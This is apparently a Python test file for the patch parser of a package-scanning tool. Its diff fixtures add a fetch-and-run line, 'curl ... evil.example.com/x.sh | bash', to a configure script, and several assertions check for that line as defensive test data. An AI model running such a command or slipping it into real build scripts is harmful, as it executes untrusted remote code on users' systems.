from __future__ import annotations

from aurmanager.parser.patch import extract_added_lines, parse_patch


_UNIFIED_DIFF = """\
--- a/configure	2026-08-18 23:24:30.789718951 +0300
+++ b/configure	2026-08-18 23:24:30.795107548 +0300
@@ -1,4 +1,5 @@
 #!/bin/sh
 echo "configuring..."
+curl -fsSL https://evil.example.com/x.sh | bash
 make_flags="-O2"
 echo "done"
"""

_GIT_STYLE_DIFF = """\
diff --git a/configure b/configure
index 5286670..d662abf 100644
--- a/configure
+++ b/configure
@@ -1,4 +1,5 @@
 #!/bin/sh
 echo "configuring..."
+curl -fsSL https://evil.example.com/x.sh | bash
 make_flags="-O2"
 echo "done"
"""


def test_extract_added_lines_keeps_only_plus_prefixed_content():
    result = extract_added_lines(_UNIFIED_DIFF)
    lines = result.split("\n")
    assert lines[5] == "curl -fsSL https://evil.example.com/x.sh | bash"
    # Every other line (headers, hunk marker, context) is blanked, not removed.
    assert lines[0] == lines[1] == lines[2] == lines[3] == lines[4] == ""
    assert lines[6] == lines[7] == ""


def test_extract_added_lines_preserves_line_count_and_therefore_line_numbers():
    original_line_count = len(_UNIFIED_DIFF.splitlines())
    result = extract_added_lines(_UNIFIED_DIFF)
    assert len(result.split("\n")) == original_line_count


def test_extract_added_lines_handles_git_style_diff_preamble():
    result = extract_added_lines(_GIT_STYLE_DIFF)
    lines = result.split("\n")
    # diff --git / index preamble lines are blanked like any other non-added line.
    assert lines[0] == lines[1] == ""
    assert "curl -fsSL https://evil.example.com/x.sh | bash" in result


def test_extract_added_lines_does_not_treat_plusplusplus_header_as_added_content():
    result = extract_added_lines(_UNIFIED_DIFF)
    assert "b/configure" not in result


def test_parse_patch_sets_is_patch_and_empty_ast(tmp_path):
    path = tmp_path / "fix.patch"
    path.write_text(_UNIFIED_DIFF)
    ctx = parse_patch(path)
    assert ctx.is_patch is True
    assert ctx.ast == []
    assert ctx.file == path
    assert "curl -fsSL https://evil.example.com/x.sh | bash" in ctx.source
